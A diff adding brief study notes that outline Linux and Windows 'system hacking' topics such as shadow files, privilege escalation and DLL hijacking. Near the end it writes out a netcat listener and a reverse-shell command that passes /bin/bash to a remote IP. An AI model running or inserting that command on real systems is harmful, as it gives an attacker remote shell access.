@@ -1,0 +1,19 @@
+- System hacking is defined as the compromise between computer systems and software to access the target computer and steal or misuse their sensitive information.
+- Linux System Hacking
+	- Hack Linux using the shadow file.
+	- ssh key leak
+	- Remote code Execution
+	- privilege Escalation
+	- bug on kernel
+- Window system hacking
+	- fundamental of window
+	- DLL Hijacking
+	- Powershell Scripting and usage
+	- managing service, Users
+	- active directory system
+- Remote shell access(bind shell, reverse shell) payload
+	- netcat -lvp 2222 
+	- netcat 192.168.1.1 2222 -e /bin/bash
+- payload (revshells.com)
+
+- 
